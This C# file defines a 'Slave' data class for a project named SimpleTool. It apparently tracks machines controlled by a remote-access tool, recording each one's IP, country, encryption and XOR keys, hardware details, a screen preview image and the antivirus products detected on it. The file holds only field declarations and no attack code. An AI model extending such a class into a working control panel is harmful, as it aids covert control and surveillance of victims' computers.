using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using SimpleTool.Enums;

namespace SimpleTool.Lists
{
    public class Slave
    {
        public string ClientID { get; set; }  //Base64(hostname:IP)
        public string IP { get; set; }
        public string Country { get; set; }
        public OnlineInfo OnlineStatus { get; set; }
        public string ConnectionKey { get; set; }
        public EncryptionKeys key { get; set; }
        public bool AssignedKeys { get; set; }
        public int GridRowAssigned { get; set; }
        public int SlaveListAssignment { get; set; }
        public bool Authorized { get; set; }
        public AuthSteps AuthStatus = new AuthSteps();
        public string XorKey { get; set; }
        public string RamPresent { get; set; }
        public string ProcessorInfo { get; set; }
        public Bitmap PreviewImg { get; set; }
        public string OSVersion { get; set; }
        public List<string> DetectedAVs = new List<string>();
    }
}
